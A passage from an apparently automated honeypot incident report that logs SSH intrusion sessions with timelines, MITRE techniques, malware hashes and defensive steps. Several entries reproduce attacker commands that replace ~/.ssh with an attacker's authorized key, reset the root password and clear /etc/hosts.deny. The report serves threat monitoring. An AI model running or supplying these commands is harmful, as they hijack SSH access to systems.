| `2026-07-04 21:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ca0c643f62

| Field | Detail |
|---|---|
| **Source IP** | `36.64.68[.]99` |
| **First Seen** | 2026-07-04 21:26 |
| **Last Seen** | 2026-07-04 21:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:26:52` | `cowrie.session.connect` |
| `2026-07-04 21:26:52` | `cowrie.client.version` |
| `2026-07-04 21:26:52` | `cowrie.client.kex` |
| `2026-07-04 21:26:53` | `cowrie.login.success` |
| `2026-07-04 21:26:54` | `cowrie.session.params` |
| `2026-07-04 21:26:54` | `cowrie.command.input` |
| `2026-07-04 21:26:54` | `cowrie.command.failed` |
| `2026-07-04 21:26:55` | `cowrie.log.closed` |
| `2026-07-04 21:26:56` | `cowrie.session.params` |
| `2026-07-04 21:26:56` | `cowrie.command.input` |
| `2026-07-04 21:26:56` | `cowrie.session.file_download` |
| `2026-07-04 21:26:56` | `cowrie.log.closed` |
| `2026-07-04 21:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.68[.]99` to AbuseIPDB if not already reported
- [ ] Block `36.64.68[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb1ac6f9a7b

| Field | Detail |
|---|---|
| **Source IP** | `36.64.68[.]99` |
| **First Seen** | 2026-07-04 21:26 |
| **Last Seen** | 2026-07-04 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:26:56` | `cowrie.session.connect` |
| `2026-07-04 21:26:56` | `cowrie.client.version` |
| `2026-07-04 21:26:56` | `cowrie.client.kex` |
| `2026-07-04 21:26:57` | `cowrie.login.success` |
| `2026-07-04 21:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.68[.]99` to AbuseIPDB if not already reported
- [ ] Block `36.64.68[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5cf9aa2a85e

| Field | Detail |
|---|---|
| **Source IP** | `36.64.68[.]99` |
| **First Seen** | 2026-07-04 21:26 |
| **Last Seen** | 2026-07-04 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:26:58` | `cowrie.session.connect` |
| `2026-07-04 21:26:58` | `cowrie.client.version` |
| `2026-07-04 21:26:58` | `cowrie.client.kex` |
| `2026-07-04 21:26:59` | `cowrie.login.success` |
| `2026-07-04 21:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.68[.]99` to AbuseIPDB if not already reported
- [ ] Block `36.64.68[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abd676515a66

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-04 21:29 |
| **Last Seen** | 2026-07-04 21:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:29:39` | `cowrie.session.connect` |
| `2026-07-04 21:29:39` | `cowrie.client.version` |
| `2026-07-04 21:29:39` | `cowrie.client.kex` |
| `2026-07-04 21:29:39` | `cowrie.login.success` |
| `2026-07-04 21:29:40` | `cowrie.session.params` |
| `2026-07-04 21:29:40` | `cowrie.command.input` |
| `2026-07-04 21:29:40` | `cowrie.command.failed` |
| `2026-07-04 21:29:40` | `cowrie.log.closed` |
| `2026-07-04 21:29:41` | `cowrie.session.params` |
| `2026-07-04 21:29:41` | `cowrie.command.input` |
| `2026-07-04 21:29:41` | `cowrie.session.file_download` |
| `2026-07-04 21:29:41` | `cowrie.log.closed` |
| `2026-07-04 21:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49447b907e20

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-04 21:29 |
| **Last Seen** | 2026-07-04 21:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:29:41` | `cowrie.session.connect` |
| `2026-07-04 21:29:41` | `cowrie.client.version` |
| `2026-07-04 21:29:41` | `cowrie.client.kex` |
| `2026-07-04 21:29:42` | `cowrie.login.success` |
| `2026-07-04 21:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746179cc8b80

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-04 21:29 |
| **Last Seen** | 2026-07-04 21:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:29:42` | `cowrie.session.connect` |
| `2026-07-04 21:29:42` | `cowrie.client.version` |
| `2026-07-04 21:29:42` | `cowrie.client.kex` |
| `2026-07-04 21:29:42` | `cowrie.login.success` |
| `2026-07-04 21:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2847e36122fd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 21:36 |
| **Last Seen** | 2026-07-04 21:36 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:36:19` | `cowrie.session.connect` |
| `2026-07-04 21:36:20` | `cowrie.client.version` |
| `2026-07-04 21:36:20` | `cowrie.client.kex` |
| `2026-07-04 21:36:27` | `cowrie.login.success` |
| `2026-07-04 21:36:30` | `cowrie.session.params` |
| `2026-07-04 21:36:30` | `cowrie.command.input` |
| `2026-07-04 21:36:31` | `cowrie.log.closed` |
| `2026-07-04 21:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd6912e7a3c

| Field | Detail |
|---|---|
| **Source IP** | `95.182.83[.]157` |
| **First Seen** | 2026-07-04 21:40 |
| **Last Seen** | 2026-07-04 21:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:40:40` | `cowrie.session.connect` |
| `2026-07-04 21:40:40` | `cowrie.client.version` |
| `2026-07-04 21:40:40` | `cowrie.client.kex` |
| `2026-07-04 21:40:41` | `cowrie.login.success` |
| `2026-07-04 21:40:43` | `cowrie.session.params` |
| `2026-07-04 21:40:43` | `cowrie.command.input` |
| `2026-07-04 21:40:43` | `cowrie.command.failed` |
| `2026-07-04 21:40:43` | `cowrie.log.closed` |
| `2026-07-04 21:40:44` | `cowrie.session.params` |
| `2026-07-04 21:40:44` | `cowrie.command.input` |
| `2026-07-04 21:40:44` | `cowrie.session.file_download` |
| `2026-07-04 21:40:44` | `cowrie.log.closed` |
| `2026-07-04 21:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.182.83[.]157` to AbuseIPDB if not already reported
- [ ] Block `95.182.83[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b15492df0c9

| Field | Detail |
|---|---|
| **Source IP** | `95.182.83[.]157` |
| **First Seen** | 2026-07-04 21:40 |
| **Last Seen** | 2026-07-04 21:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:40:44` | `cowrie.session.connect` |
| `2026-07-04 21:40:44` | `cowrie.client.version` |
| `2026-07-04 21:40:44` | `cowrie.client.kex` |
| `2026-07-04 21:40:46` | `cowrie.login.success` |
| `2026-07-04 21:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.182.83[.]157` to AbuseIPDB if not already reported
- [ ] Block `95.182.83[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3931688605e5

| Field | Detail |
|---|---|
| **Source IP** | `95.182.83[.]157` |
| **First Seen** | 2026-07-04 21:40 |
| **Last Seen** | 2026-07-04 21:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:40:46` | `cowrie.session.connect` |
| `2026-07-04 21:40:46` | `cowrie.client.version` |
| `2026-07-04 21:40:47` | `cowrie.client.kex` |
| `2026-07-04 21:40:48` | `cowrie.login.success` |
| `2026-07-04 21:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.182.83[.]157` to AbuseIPDB if not already reported
- [ ] Block `95.182.83[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a8223e1b8e9

| Field | Detail |
|---|---|
| **Source IP** | `101.126.67[.]255` |
| **First Seen** | 2026-07-04 21:45 |
| **Last Seen** | 2026-07-04 21:45 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Hl3ZJvKC35Dx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:45:19` | `cowrie.session.connect` |
| `2026-07-04 21:45:19` | `cowrie.client.version` |
| `2026-07-04 21:45:19` | `cowrie.client.kex` |
| `2026-07-04 21:45:20` | `cowrie.login.success` |
| `2026-07-04 21:45:21` | `cowrie.session.params` |
| `2026-07-04 21:45:21` | `cowrie.command.input` |
| `2026-07-04 21:45:21` | `cowrie.command.failed` |
| `2026-07-04 21:45:22` | `cowrie.log.closed` |
| `2026-07-04 21:45:23` | `cowrie.session.params` |
| `2026-07-04 21:45:23` | `cowrie.command.input` |
| `2026-07-04 21:45:23` | `cowrie.session.file_download` |
| `2026-07-04 21:45:23` | `cowrie.log.closed` |
| `2026-07-04 21:45:40` | `cowrie.session.params` |
| `2026-07-04 21:45:40` | `cowrie.command.input` |
| `2026-07-04 21:45:40` | `cowrie.log.closed` |
| `2026-07-04 21:45:41` | `cowrie.session.params` |
| `2026-07-04 21:45:41` | `cowrie.command.input` |
| `2026-07-04 21:45:41` | `cowrie.log.closed` |
| `2026-07-04 21:45:42` | `cowrie.session.params` |
| `2026-07-04 21:45:42` | `cowrie.command.input` |
| `2026-07-04 21:45:42` | `cowrie.session.file_download` |
| `2026-07-04 21:45:42` | `cowrie.log.closed` |
| `2026-07-04 21:45:43` | `cowrie.session.params` |
| `2026-07-04 21:45:43` | `cowrie.command.input` |
| `2026-07-04 21:45:44` | `cowrie.log.closed` |
| `2026-07-04 21:45:45` | `cowrie.session.params` |
| `2026-07-04 21:45:45` | `cowrie.command.input` |
| `2026-07-04 21:45:45` | `cowrie.log.closed` |
| `2026-07-04 21:45:46` | `cowrie.session.params` |
| `2026-07-04 21:45:46` | `cowrie.command.input` |
| `2026-07-04 21:45:46` | `cowrie.command.input` |
| `2026-07-04 21:45:46` | `cowrie.log.closed` |
| `2026-07-04 21:45:47` | `cowrie.session.params` |
| `2026-07-04 21:45:47` | `cowrie.command.input` |
| `2026-07-04 21:45:47` | `cowrie.log.closed` |
| `2026-07-04 21:45:48` | `cowrie.session.params` |
| `2026-07-04 21:45:48` | `cowrie.command.input` |
| `2026-07-04 21:45:49` | `cowrie.log.closed` |
| `2026-07-04 21:45:49` | `cowrie.session.params` |
| `2026-07-04 21:45:49` | `cowrie.command.input` |
| `2026-07-04 21:45:50` | `cowrie.log.closed` |
| `2026-07-04 21:45:51` | `cowrie.session.params` |
| `2026-07-04 21:45:51` | `cowrie.command.input` |
| `2026-07-04 21:45:51` | `cowrie.log.closed` |
| `2026-07-04 21:45:52` | `cowrie.session.params` |
| `2026-07-04 21:45:52` | `cowrie.command.input` |
| `2026-07-04 21:45:52` | `cowrie.log.closed` |
| `2026-07-04 21:45:53` | `cowrie.session.params` |
| `2026-07-04 21:45:53` | `cowrie.command.input` |
| `2026-07-04 21:45:53` | `cowrie.log.closed` |
| `2026-07-04 21:45:54` | `cowrie.session.params` |
| `2026-07-04 21:45:54` | `cowrie.command.input` |
| `2026-07-04 21:45:55` | `cowrie.log.closed` |
| `2026-07-04 21:45:56` | `cowrie.session.params` |
| `2026-07-04 21:45:56` | `cowrie.command.input` |
| `2026-07-04 21:45:56` | `cowrie.log.closed` |
| `2026-07-04 21:45:57` | `cowrie.session.params` |
| `2026-07-04 21:45:57` | `cowrie.command.input` |
| `2026-07-04 21:45:57` | `cowrie.log.closed` |
| `2026-07-04 21:45:58` | `cowrie.session.params` |
| `2026-07-04 21:45:58` | `cowrie.command.input` |
| `2026-07-04 21:45:58` | `cowrie.log.closed` |
| `2026-07-04 21:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.67[.]255` to AbuseIPDB if not already reported
- [ ] Block `101.126.67[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfb02ba7b0f

| Field | Detail |
|---|---|
| **Source IP** | `160.187.180[.]146` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:35` | `cowrie.session.connect` |
| `2026-07-04 21:47:35` | `cowrie.client.version` |
| `2026-07-04 21:47:35` | `cowrie.client.kex` |
| `2026-07-04 21:47:36` | `cowrie.login.success` |
| `2026-07-04 21:47:37` | `cowrie.session.params` |
| `2026-07-04 21:47:37` | `cowrie.command.input` |
| `2026-07-04 21:47:37` | `cowrie.command.failed` |
| `2026-07-04 21:47:37` | `cowrie.log.closed` |
| `2026-07-04 21:47:38` | `cowrie.session.params` |
| `2026-07-04 21:47:38` | `cowrie.command.input` |
| `2026-07-04 21:47:38` | `cowrie.session.file_download` |
| `2026-07-04 21:47:38` | `cowrie.log.closed` |
| `2026-07-04 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.187.180[.]146` to AbuseIPDB if not already reported
- [ ] Block `160.187.180[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4817544f34ba

| Field | Detail |
|---|---|
| **Source IP** | `160.187.180[.]146` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:39` | `cowrie.session.connect` |
| `2026-07-04 21:47:39` | `cowrie.client.version` |
| `2026-07-04 21:47:39` | `cowrie.client.kex` |
| `2026-07-04 21:47:40` | `cowrie.login.success` |
| `2026-07-04 21:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.187.180[.]146` to AbuseIPDB if not already reported
- [ ] Block `160.187.180[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7ea75ca45c

| Field | Detail |
|---|---|
| **Source IP** | `95.165.27[.]83` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:39` | `cowrie.session.connect` |
| `2026-07-04 21:47:39` | `cowrie.client.version` |
| `2026-07-04 21:47:39` | `cowrie.client.kex` |
| `2026-07-04 21:47:39` | `cowrie.login.success` |
| `2026-07-04 21:47:40` | `cowrie.session.params` |
| `2026-07-04 21:47:40` | `cowrie.command.input` |
| `2026-07-04 21:47:40` | `cowrie.command.failed` |
| `2026-07-04 21:47:41` | `cowrie.log.closed` |
| `2026-07-04 21:47:41` | `cowrie.session.params` |
| `2026-07-04 21:47:41` | `cowrie.command.input` |
| `2026-07-04 21:47:41` | `cowrie.session.file_download` |
| `2026-07-04 21:47:41` | `cowrie.log.closed` |
| `2026-07-04 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.27[.]83` to AbuseIPDB if not already reported
- [ ] Block `95.165.27[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f0385bee20

| Field | Detail |
|---|---|
| **Source IP** | `160.187.180[.]146` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:41` | `cowrie.session.connect` |
| `2026-07-04 21:47:41` | `cowrie.client.version` |
| `2026-07-04 21:47:41` | `cowrie.client.kex` |
| `2026-07-04 21:47:42` | `cowrie.login.success` |
| `2026-07-04 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.187.180[.]146` to AbuseIPDB if not already reported
- [ ] Block `160.187.180[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b0b1efc0d0

| Field | Detail |
|---|---|
| **Source IP** | `95.165.27[.]83` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:41` | `cowrie.session.connect` |
| `2026-07-04 21:47:41` | `cowrie.client.version` |
| `2026-07-04 21:47:42` | `cowrie.client.kex` |
| `2026-07-04 21:47:42` | `cowrie.login.success` |
| `2026-07-04 21:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.27[.]83` to AbuseIPDB if not already reported
- [ ] Block `95.165.27[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af6deb8a213

| Field | Detail |
|---|---|
| **Source IP** | `95.165.27[.]83` |
| **First Seen** | 2026-07-04 21:47 |
| **Last Seen** | 2026-07-04 21:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:47:42` | `cowrie.session.connect` |
| `2026-07-04 21:47:42` | `cowrie.client.version` |
| `2026-07-04 21:47:43` | `cowrie.client.kex` |
| `2026-07-04 21:47:43` | `cowrie.login.success` |
| `2026-07-04 21:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.165.27[.]83` to AbuseIPDB if not already reported
- [ ] Block `95.165.27[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77e26e2341f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 21:48 |
| **Last Seen** | 2026-07-04 21:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
